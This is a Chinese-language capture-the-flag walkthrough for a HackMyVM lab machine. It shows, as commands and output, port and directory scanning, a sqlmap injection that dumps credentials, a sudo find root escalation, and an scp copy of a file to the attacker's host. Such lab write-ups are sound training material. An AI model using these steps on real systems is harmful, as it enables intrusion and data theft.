# 一、信息收集

首先，在当前网段内进行主机发现，确定目标靶机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:99:80:8f       PCS Systemtechnik GmbH
...
```

目标主机IP为 `192.168.205.132`。

接下来，使用Nmap对目标主机进行全端口扫描，以探测其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:04 EDT
Nmap scan report for novice.com (192.168.205.132)
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:99:80:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

扫描结果显示，目标开放了 `22` (SSH) 和 `80` (HTTP) 两个端口。我们从Web服务入手。

# 二、Web渗透

访问目标 `http://192.168.205.132`，发现是一个静态图片展示页面，没有可交互的功能点。因此，决定进行目录爆破来发现更多信息。

使用 `gobuster` 进行目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 64
===============================================================
...
[+] Url:                     http://192.168.205.132
...
===============================================================
/index.html           (Status: 200) [Size: 825]
/login.php            (Status: 200) [Size: 352]
/index2.php           (Status: 200) [Size: 75134]
/server-status        (Status: 403) [Size: 280]
...
===============================================================
```

扫描发现了 `index2.php` 和 `login.php`。访问 `index2.php`，发现是一个功能复杂的仿黑客交互式页面。在页面的 "CRYPTO" 模块中，找到了一段十六进制编码的字符串：

```
48 6f 6c 61 20 41 6c 69 74 61 2c 20 ... 6c 61 20 72 65 64 2e
```

使用 CyberChef 将其转换为文本，得到以下信息：

> 嗨，Alita，希望你正在读这条加密信息。要破解系统，你需要使用我解释过的技术。我已经把访问代码和验证码“pandora”给了你。线上见。

虽然得到了 “pandora” 这个关键信息，但当时并未完全理解其用途。

继续探索 `index2.php` 的其他模块，在 "NEXUS" 模块中发现了一条重要的提示信息，指向了一个新的登录路径：

![image-20250824172310725](http://7r1UMPHK.github.io/image/20250824174142762.webp)

`NEXUS MSG> _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php`

访问 `http://192.168.205.132/auth-login.php`，发现一个登录框。尝试输入 `admin` 并在密码框中输入一个单引号 `'`，页面返回了SQL错误，表明此处存在SQL注入漏洞。

使用 `sqlmap` 对该登录表单进行自动化注入攻击：

```bash
sqlmap -u "http://192.168.205.132/auth-login.php" --batch --forms --dump
```

`sqlmap` 成功识别并利用了注入点，从数据库中 dump 出了 `users` 表的内容：

```
...
Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
...
```

我们获得了一组有效的凭证：`shelly` / `F4ckTh3F4k3H4ck3r5`。

# 三、权限提升

利用上一步获取的凭证，通过SSH登录目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh shelly@192.168.205.132
shelly@192.168.205.132's password: F4ckTh3F4k3H4ck3r5

... Welcome Banner ...

shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly)...
```

登录成功后，立即检查当前用户的 `sudo` 权限。

```bash
shelly@NexusLabCTF:~$ sudo -l
...
User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

结果显示，`shelly` 用户可以无需密码以 `root` 权限执行 `/usr/bin/find` 命令。`find` 命令可以通过 `-exec` 参数执行任意命令，这是一个经典的提权向量。

利用 `find` 命令提权至 `root`：

```bash
shelly@NexusLabCTF:~$ sudo find . -exec /bin/bash \; -quit
root@NexusLabCTF:/home/shelly# id
uid=0(root) gid=0(root) groups=0(root)
```

成功获取 `root` 权限。首先，读取用户 flag：

```bash
root@NexusLabCTF:/home/shelly# cat /home/shelly/SA/user-flag.txt 
...
HackMyVM
Flag User ::  82kd8FJ5SJ00HMVUS3R36gd
```

# 四、最终Flag获取

在 `root` 用户的家目录下，发现了一个名为 `Sion-Code` 的目录，其中包含一个图片文件 `use-fim-to-root.png`。文件名暗示了最终的 flag 可能与这个文件有关。

为了方便分析，使用 `scp` 将该图片文件传回 Kali 攻击机。

```bash
# 在靶机上执行
root@NexusLabCTF:~/Sion-Code# scp use-fim-to-root.png kali@192.168.205.128:/mnt/hgfs/gx/x
...
use-fim-to-root.png                                     100%   71KB  19.7MB/s   00:00
```

![use-fim-to-root](http://7r1UMPHK.github.io/image/20250824174140496.webp)

回到 Kali，使用 `strings` 命令检查图片文件中是否隐藏了可打印的字符串。这种方法常用于在文件中寻找被隐藏的信息（一种简单的隐写术）。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ strings use-fim-to-root.png | tail -n 1
;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```

在文件的末尾成功找到了最终的 root flag。渗透测试完成。